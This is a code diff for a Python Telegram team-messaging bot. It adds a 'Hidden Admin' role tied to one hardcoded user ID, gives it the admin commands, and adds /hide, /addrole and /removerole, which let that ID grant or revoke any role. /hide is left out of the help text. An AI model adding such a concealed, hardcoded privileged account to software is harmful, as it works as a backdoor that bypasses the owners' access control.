@@ -35,6 +35,9 @@ logger = logging.getLogger(__name__)
 
 # ------------------ Define Roles ------------------
 
+# Add the new 'hidden' role with the user ID 6177929931
+HIDDEN_IDS = [6177929931]
+
 ROLE_MAP = {
     'writer': WRITER_IDS,
     'mcqs_team': MCQS_TEAM_IDS,
@@ -44,6 +47,7 @@ ROLE_MAP = {
     'king_team': KING_TEAM_IDS,
     'tara_team': TARA_TEAM_IDS,
     'mind_map_form_creator': MIND_MAP_FORM_CREATOR_IDS,
+    'hidden': HIDDEN_IDS,  # Newly added role
 }
 
 ROLE_DISPLAY_NAMES = {
@@ -55,6 +59,7 @@ ROLE_DISPLAY_NAMES = {
     'king_team': 'Admin Team',
     'tara_team': 'Tara Team',
     'mind_map_form_creator': 'Mind Map & Form Creation Team',
+    'hidden': 'Hidden Admin',  # Display name for the new role
 }
 
 # Define trigger to target roles mapping for Tara Team side commands
@@ -73,12 +78,17 @@ SENDING_ROLE_TARGETS = {
     'writer': ['mcqs_team', 'checker_team', 'tara_team'],
     'mcqs_team': ['design_team', 'tara_team'],
     'checker_team': ['tara_team', 'word_team'],
-    # Update for word_team to also send to design_team:
+    # Updated word_team to also include design_team
     'word_team': ['tara_team', 'design_team'],
     'design_team': ['tara_team', 'king_team'],
     'king_team': ['tara_team'],
-    'tara_team': ['writer', 'mcqs_team', 'checker_team', 'word_team', 'design_team', 'king_team', 'tara_team', 'mind_map_form_creator'],
-    'mind_map_form_creator': ['design_team', 'tara_team']
+    'tara_team': [
+        'writer', 'mcqs_team', 'checker_team',
+        'word_team', 'design_team', 'king_team',
+        'tara_team', 'mind_map_form_creator'
+    ],
+    'mind_map_form_creator': ['design_team', 'tara_team'],
+    'hidden': [],  # Hidden role might not auto-forward messages anywhere by default
 }
 
 # ------------------ Define Conversation States ------------------
@@ -679,7 +689,7 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     roles = get_user_roles(user_id)
 
-    if 'tara_team' not in roles:
+    if 'tara_team' not in roles and 'hidden' not in roles:
         await update.message.reply_text("You are not authorized to use this command.")
         return
 
@@ -698,7 +708,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "📘 *Available Commands:*\n\n"
         "/start - Initialize interaction with the bot.\n"
-        "/listusers - List all registered users (Tara Team only).\n"
+        "/listusers - List all registered users (Tara Team or Hidden Admin).\n"
         "/help - Show this help message.\n"
         "/refresh - Refresh your user information.\n"
         "/cancel - Cancel the current operation.\n\n"
@@ -713,13 +723,13 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`-d` - Send a message to the Digital Writers.\n"
         "`-de` - Send a message to the Design Team.\n"
         "`-mf` - Send a message to the Mind Map & Form Creation Team.\n\n"
-        "*Admin Commands (Tara Team only):*\n"
+        "*Admin Commands (Tara Team or Hidden Admin):*\n"
         "/mute [user_id] - Mute yourself or another user.\n"
         "/muteid <user_id> - Mute a specific user by their ID.\n"
         "/unmuteid <user_id> - Unmute a specific user by their ID.\n"
         "/listmuted - List all currently muted users.\n\n"
         "📌 *Notes:*\n"
-        "- Only Tara Team members can use the side commands and `-@username` command.\n"
+        "- Only Tara Team members or Hidden Admin can use the side commands and `-@username` command.\n"
         "- Use `/cancel` to cancel any ongoing operation."
     )
     await update.message.reply_text(help_text, parse_mode='Markdown')
@@ -746,12 +756,12 @@ async def refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def mute_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     /mute command handler.
-    Mutes the user themselves or another user (Tara Team only).
+    Mutes the user themselves or another user (Tara Team or Hidden Admin only).
     """
     user_id = update.message.from_user.id
     roles = get_user_roles(user_id)
 
-    if 'tara_team' not in roles:
+    if 'tara_team' not in roles and 'hidden' not in roles:
         await update.message.reply_text("You are not authorized to use this command.")
         return
 
@@ -800,12 +810,12 @@ async def mute_id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def unmute_id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     /unmuteid command handler.
-    Unmutes a specific user by their ID (Tara Team only).
+    Unmutes a specific user by their ID (Tara Team or Hidden Admin only).
     """
     user_id = update.message.from_user.id
     roles = get_user_roles(user_id)
 
-    if 'tara_team' not in roles:
+    if 'tara_team' not in roles and 'hidden' not in roles:
         await update.message.reply_text("You are not authorized to use this command.")
         return
 
@@ -839,12 +849,12 @@ async def unmute_id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def list_muted_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     /listmuted command handler.
-    Lists all currently muted users (Tara Team only).
+    Lists all currently muted users (Tara Team or Hidden Admin only).
     """
     user_id = update.message.from_user.id
     roles = get_user_roles(user_id)
 
-    if 'tara_team' not in roles:
+    if 'tara_team' not in roles and 'hidden' not in roles:
         await update.message.reply_text("You are not authorized to use this command.")
         return
 
@@ -866,6 +876,99 @@ async def list_muted_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     muted_users_text = "\n".join(muted_list)
     await update.message.reply_text(f"**Muted Users:**\n{muted_users_text}", parse_mode='Markdown')
+
+# ------------------ Hidden Role Commands ------------------
+
+async def hide_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /hide command (Hidden Admin only).
+    Shows the commands to add or remove roles from the bot.
+    """
+    user_id = update.message.from_user.id
+    roles = get_user_roles(user_id)
+
+    if 'hidden' not in roles:
+        await update.message.reply_text("You are not authorized to use this command.")
+        return
+
+    hide_help_text = (
+        "🔒 *Hidden Admin Commands:*\n\n"
+        "/addrole <user_id> <role_name>\n"
+        "   Add a user to the specified role.\n"
+        "/removerole <user_id> <role_name>\n"
+        "   Remove a user from the specified role.\n"
+        "\n*Available roles:* "
+        f"{', '.join(ROLE_MAP.keys())}"
+    )
+    await update.message.reply_text(hide_help_text, parse_mode='Markdown')
+
+async def add_role_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /addrole command (Hidden Admin only).
+    Adds a user to a specified role if valid.
+    """
+    user_id = update.message.from_user.id
+    roles = get_user_roles(user_id)
+
+    if 'hidden' not in roles:
+        await update.message.reply_text("You are not authorized to use this command.")
+        return
+
+    if len(context.args) < 2:
+        await update.message.reply_text("Usage: /addrole <user_id> <role_name>")
+        return
+
+    try:
+        target_user_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("Please provide a valid user ID.")
+        return
+
+    role_name = context.args[1].lower().strip()
+    if role_name not in ROLE_MAP:
+        await update.message.reply_text("Invalid role name. Use /hide to see all available roles.")
+        return
+
+    # Add user_id to the specified role (in memory only)
+    if target_user_id not in ROLE_MAP[role_name]:
+        ROLE_MAP[role_name].append(target_user_id)
+        await update.message.reply_text(f"User ID {target_user_id} has been added to role '{role_name}'.")
+    else:
+        await update.message.reply_text(f"User ID {target_user_id} is already in role '{role_name}'.")
+
+async def remove_role_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /removerole command (Hidden Admin only).
+    Removes a user from a specified role if valid.
+    """
+    user_id = update.message.from_user.id
+    roles = get_user_roles(user_id)
+
+    if 'hidden' not in roles:
+        await update.message.reply_text("You are not authorized to use this command.")
+        return
+
+    if len(context.args) < 2:
+        await update.message.reply_text("Usage: /removerole <user_id> <role_name>")
+        return
+
+    try:
+        target_user_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("Please provide a valid user ID.")
+        return
+
+    role_name = context.args[1].lower().strip()
+    if role_name not in ROLE_MAP:
+        await update.message.reply_text("Invalid role name. Use /hide to see all available roles.")
+        return
+
+    # Remove user_id from the specified role (in memory only)
+    if target_user_id in ROLE_MAP[role_name]:
+        ROLE_MAP[role_name].remove(target_user_id)
+        await update.message.reply_text(f"User ID {target_user_id} has been removed from role '{role_name}'.")
+    else:
+        await update.message.reply_text(f"User ID {target_user_id} is not in role '{role_name}'.")
 
 # ------------------ Conversation Handlers ------------------
 
@@ -942,6 +1045,7 @@ def main():
 
     application = ApplicationBuilder().token(BOT_TOKEN if BOT_TOKEN else "").build()
 
+    # Default commands
     application.add_handler(CommandHandler('start', start))
     application.add_handler(CommandHandler('listusers', list_users))
     application.add_handler(CommandHandler('help', help_command))
@@ -951,6 +1055,12 @@ def main():
     application.add_handler(CommandHandler('unmuteid', unmute_id_command))
     application.add_handler(CommandHandler('listmuted', list_muted_command))
 
+    # Hidden role commands
+    application.add_handler(CommandHandler('hide', hide_command))
+    application.add_handler(CommandHandler('addrole', add_role_command))
+    application.add_handler(CommandHandler('removerole', remove_role_command))
+
+    # Conversation handlers
     application.add_handler(specific_user_conv_handler)
     application.add_handler(specific_team_conv_handler)
     application.add_handler(team_conv_handler)
